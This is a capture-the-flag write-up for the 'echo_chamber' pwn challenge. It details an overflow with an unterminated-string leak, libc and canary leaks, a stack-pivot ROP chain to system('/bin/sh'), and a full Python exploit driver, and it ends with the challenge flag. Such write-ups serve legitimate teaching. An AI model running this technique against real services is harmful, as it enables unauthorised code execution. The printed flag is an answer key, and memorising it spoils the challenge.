# echo_chamber

**Category:** Pwn

## Solution

### 1. Find both memory bugs

The program read up to `0x70` bytes into an `0x50`-byte buffer, then printed it as a string without adding a terminator:

```c
static void chamber(void) {
    char buf[0x50];
    puts("The chamber listens. Say 'bye' to leave.");
    for (;;) {
        printf("> ");
        read(0, buf, 0x70);
        if (strncmp(buf, "bye", 3) == 0)
            break;
        printf("echo: %s\n", buf);
    }
}
```

The binary had a stack canary, PIE, and Full RELRO. The format string was fixed; the information leak came from the unterminated `%s` read.

In the disassembly, I found the buffer at `rbp-0x60` and the canary at `rbp-0x8`. The write reaches through the saved return address, leaving room for one return address but no longer chain after it.

### 2. Leak libc from the echo

I classified candidate pointers against `/proc/<pid>/maps` during local runs of the supplied binary. The pointer after an `0x50`-byte fill was a PIE pointer; it was not the libc leak I needed.

A `0x28`-byte fill exposed a libc code pointer. I subtracted `0x816a5` and checked that the resulting base was page-aligned. Those offsets are specific to the shipped libc.

### 3. Leak and restore the canary

I sent `b'Q' * 0x50 + b'B' * 8 + b'C'`. The final nonzero byte replaced the canary's leading NUL, allowing the echo to expose its seven remaining bytes and the saved frame pointer.

I restored the leading `\x00` when constructing the final payload. From the frame layout, I calculated the buffer address as `main_rbp - 0x70`. An embedded NUL inside a random leak could truncate it, so my driver retried with a fresh process when necessary.

### 4. Put the chain in the buffer and pivot

I found these offsets in the matching libc:

```text
pop rdi; ret : 0x2a3e5
ret          : 0x29cd6
leave; ret   : 0x5629c
system       : 0x50d70
"/bin/sh"    : 0x1d8678
```

The raw bytes `5f c3` supplied the `pop rdi; ret` gadget at an unaligned address. I placed the chain inside the buffer, restored the canary, set saved `rbp` to the buffer address, and set the return address to `leave; ret`.

```text
[0x00] disposable qword / fake saved rbp
[0x08] pop rdi; ret
[0x10] address of "/bin/sh"
[0x18] ret (alignment)
[0x20] system
[0x28..0x4f] filler
[0x50] 8 padding bytes
[0x58] restored canary (\x00 + 7 leaked bytes)
[0x60] buf_addr (saved rbp)
[0x68] libc leave; ret (saved return address)
```

The first qword is a disposable frame value. The extra `ret` before `system` supplies stack alignment.

### 5. Send the payload

This is the core of my driver. The `io.send` and `io.recv_until` calls use my transport wrapper; this excerpt needs that wrapper to run.

```python
p64 = lambda v: int(v).to_bytes(8, 'little')
u64 = lambda b: int.from_bytes(b.ljust(8, b'\x00'), 'little')
echo_of = lambda r: r.split(b'echo: ', 1)[1].split(b'\n', 1)[0]

io.recv_until(b'> ')
io.send(b'Q' * 0x28)                          # libc leak
leak = echo_of(io.recv_until(b'> '))[0x28:]
libc_base = u64(leak[:6]) - 0x816A5
assert libc_base % 0x1000 == 0

io.send(b'Q' * 0x50 + b'B' * 8 + b'C')        # canary and stack leak
leak = echo_of(io.recv_until(b'> '))[0x59:]
canary = b'\x00' + leak[:7]
main_rbp = u64(leak[7:13])
buf = main_rbp - 0x70

rop = (p64(0x4141414141414141)
       + p64(libc_base + 0x2A3E5)
       + p64(libc_base + 0x1D8678)
       + p64(libc_base + 0x29CD6)
       + p64(libc_base + 0x50D70))

payload = (rop.ljust(0x50, b'P') + b'Q' * 8 + canary
           + p64(buf) + p64(libc_base + 0x5629C))
assert len(payload) == 0x70

io.send(payload)
io.recv_until(b'> ')
io.send(b'bye\n')                           # returns from chamber
```

Sending `bye\n` leaves the loop and reaches the protected epilogue. The restored canary passes the check, and the overwritten frame then pivots into the buffer.

### 6. Recover the flag from the shell

In the remote run, I got libc base `0x70df296f3000`, canary `00 e3 7e 5f 25 94 ec 68`, `main_rbp=0x7ffdafaea4e0`, and `buf=0x7ffdafaea470`.

The shell returned `SHELL_OK`, UID `10001(ctf)`, and `/` as the working directory. I found a `flag -> /tmp/flag` symlink and used `cat flag*` to read the flag.

## Flag

```text
CSCTF{i7B9xaHOuurq6wmYew31Pb6W}
```
